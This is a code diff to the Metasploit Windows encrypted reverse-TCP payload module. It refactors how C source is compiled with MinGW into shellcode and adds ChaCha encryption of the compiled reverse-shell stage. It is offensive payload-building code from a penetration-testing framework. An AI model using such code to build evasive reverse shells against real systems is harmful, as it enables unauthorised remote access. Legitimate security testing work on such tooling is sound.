@@ -48,17 +48,7 @@ module Payload::Windows::EncryptedReverseTcp
       arch:          self.arch_to_s
     }
 
-    Metasploit::Framework::Compiler::Mingw.compile_c(src, compile_opts)
-
-    comp_file = "#{Msf::Config.install_root}/#{compile_opts[:f_name]}"
-    return print_error('Payload did not compile') unless File.exist?("#{Msf::Config.install_root}/#{compile_opts[:f_name]}")
-    bin = read_exe(comp_file)
-    bin = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(bin))
-
-    text_section = bin.sections.first
-    text_section = text_section._isource
-    
-    text_section.rawdata
+    get_compiled_shellcode(src, compile_opts)
   end
 
   def initial_code
@@ -87,13 +77,21 @@ module Payload::Windows::EncryptedReverseTcp
     nonce = "bCsEzT3QbCsE"
     block_count = "\x01\x00\x00\x00"
     iv = block_count + nonce
-=begin
+
+    comp_opts =
+    {
+      strip_symbols: false,
+      linker_script: datastore['LinkerScript'],
+      align_obj:     datastore['AlignObj'] || '',
+      f_name:        'reverse_pic_stage.exe',
+      arch:          self.arch_to_s
+    }
+
     src = initial_code
     src << init_proc
     src << exec_payload_stage
-=end
-    src = super(opts)
-    src = Rex::Crypto.chacha_encrypt(key, iv, src)
+    shellcode = get_compiled_shellcode(src, comp_opts)
+    Rex::Crypto.chacha_encrypt(key, iv, shellcode)
   end
 
   def generate_c_src(conf)
@@ -113,6 +111,20 @@ module Payload::Windows::EncryptedReverseTcp
 
   def get_hash(lib, func)
     Rex::Text.block_api_hash(lib, func)
+  end
+
+  def get_compiled_shellcode(src, opts={})
+    Metasploit::Framework::Compiler::Mingw.compile_c(src, opts)
+
+    comp_file = "#{Msf::Config.install_root}/#{opts[:f_name]}"
+    return print_error('Payload did not compile') unless File.exist?("#{Msf::Config.install_root}/#{opts[:f_name]}")
+    bin = read_exe(comp_file)
+    bin = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(bin))
+
+    text_section = bin.sections.first
+    text_section = text_section._isource
+
+    text_section.rawdata
   end
 
   def read_exe(file)
